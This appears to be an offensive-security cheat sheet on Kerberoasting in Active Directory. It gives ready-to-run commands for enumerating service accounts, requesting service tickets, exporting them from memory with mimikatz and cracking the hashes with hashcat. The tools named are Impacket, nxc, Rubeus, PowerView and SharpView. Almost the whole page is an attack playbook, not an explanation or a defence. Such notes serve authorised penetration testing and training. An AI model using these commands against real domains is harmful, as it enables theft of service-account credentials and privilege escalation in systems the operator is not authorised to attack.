# Kerberoasting

### Automatic

{% tabs %}
{% tab title="Linux" %}
```shellscript
# List SPNs accounts => Look for the ones in interesting groups (ex domain admins)
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>

# Pull all TGS 
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile <OUTPUT_FILE>

# Pull single TGS
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_ACCOUNT> -outputfile <OUTPUT_FILE>

# List kerberoastable accounts and retreive the hash
nxc ldap <IP> -u <USER> -p <PASSWORD> --kerberoasting output
```
{% endtab %}

{% tab title="Windows" %}
```shellscript
# Get users with SPN populated => listing of accounts susceptible to kerberoasting
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName   # ActiveDirectory module
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName   # PowerView
.\SharpView.exe Get-DomainUser -Identity <USER>   # SharpView
.\Rubeus.exe kerberoast /user:*   # Rubeus
setspn.exe -Q */*   # cmd.exe

# Get the hash
.\Rubeus.exe kerberoast /user:<USER> /tgtdeleg /nowrap   # Rubeus
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat   # PowerView
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<OUTPUT_FILE>.csv -NoTypeInformation   # PowerView all users hashes to a csv
```
{% endtab %}
{% endtabs %}

### Manual

```shellscript
# List SPN accounts
setspn.exe -Q */*

# Request TGS for a single account
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieve tickets for all accounts with SPN set (not optimal)
setspn.exe -T <DOMAIN> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Extract tickets from memory with mimikatz
# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets 
# and write them to .kirbi files. Depending on our position on the network and if we can
# easily move files to our attack host, this can be easier when we go to crack the tickets
base64 /out:true
kerberos::list /export  

# Prepare the b64 for cracking
echo "<base64 blob>" |  tr -d \\n | base64 -d > <OUTPUT_FILE>.kirbi

# Get the hash from the ticket
https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py
python2.7 kirbi2john.py <KIRBI_FILE>    # Will create a crack_file 

# Modify the crackfile to be compatible with hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <OUTPUT_FILE>
```

Crack the obtained hash

```shellscript
hashcat -m 13100 <HASH> <WORDLIST>
```
